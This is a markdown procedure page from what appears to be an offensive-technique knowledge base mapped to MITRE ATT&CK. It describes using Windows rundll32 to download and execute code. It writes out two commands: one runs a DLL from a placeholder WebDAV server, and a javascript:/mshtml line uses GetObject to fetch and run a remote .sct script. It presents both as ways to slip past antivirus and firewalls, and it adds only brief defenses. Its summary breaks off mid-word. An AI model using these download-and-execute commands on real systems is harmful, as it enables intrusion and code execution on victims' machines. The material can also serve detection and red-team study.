---
id: 84735653-f00d-47e0-837b-707e8b568d05
name: Rundll32 Download and Execute via WebDAV and Remote Script Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.898346+00:00'
updated_at: '2023-04-10T20:37:09.581680+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Execution through API|T1106 - Execution through API]]'
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
- '[[Remote File Copy|T1105 - Remote File Copy]]'
tags:
- '[[Rundll32]]'
- '[[Windows - Download and execute methods]]'
commands:
- '[[Execute payload.dll entrypoint]]'
---

# Rundll32 Download and Execute via WebDAV and Remote Script Execution

## Summary

Rundll32 can be used to execute code that is downloaded from the internet via WebDAV or Remote Script Execution. This technique allows an attacker to bypass traditional security measures like firewalls and antivirus software. By using the rundll32 command, the attacker can execute code without havi

## Description

# Description

Rundll32 can be used to execute code that is downloaded from the internet via WebDAV or Remote Script Execution. This technique allows an attacker to bypass traditional security measures like firewalls and antivirus software. By using the rundll32 command, the attacker can execute code without having to write a file to disk, making detection more difficult. The business value of this attack is that it allows the attacker to gain a foothold in the target's system, which can be used to launch further attacks.

## Requirements

1. Access to a vulnerable system

1. WebDAV or Remote Script Execution access

## Defense

1. Use application whitelisting to block rundll32.exe from running

1. Monitor for suspicious network traffic to known malicious domains

1. Keep systems and software up to date to prevent vulnerabilities that can be exploited by attackers.

## Objectives

1. Download and execute malicious code on the target system

# Instructions

1. Execute a payload stored on a remote WebDAV server using rundll32.

**Code**: [[rundll32 \\webdavserver\folder\payload.dll,entrypo]]

> This command executes a malicious payload stored on a remote WebDAV server using the rundll32 utility. The command takes the path to the remote payload DLL file and the name of the entry point function as arguments. Once executed, the payload will run with the privileges of the current user. This technique can be used by an attacker to bypass traditional security measures such as antivirus software or firewalls, as the payload is not stored locally on the victim's machine.

**Command** ([[Execute payload.dll entrypoint]]):

```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

2. This command executes a remote script by running a JavaScript file on the target system using rundll32.exe. The script is downloaded from the specified web server and executed locally on the target system.

**Code**: [[rundll32.exe javascript:"\..\mshtml,RunHTMLApplica]]

> The 'rundll32.exe' command is used to execute DLL functions. In this case, it is used to execute a JavaScript file that is downloaded from a remote server. The 'javascript:"\..\mshtml,RunHTMLApplication"' argument is used to run the specified JavaScript file. The 'GetObject("script:http://webserver/payload.sct")' argument is used to download the script from the specified web server. Finally, the 'window.close()' argument is used to close the window after the script has been executed.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Execution through API|T1106 - Execution through API]]
- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]
- [[Remote File Copy|T1105 - Remote File Copy]]

## Commands Used

- [[Execute payload.dll entrypoint]]

## Tags

- [[Rundll32]]
- [[Windows - Download and execute methods]]
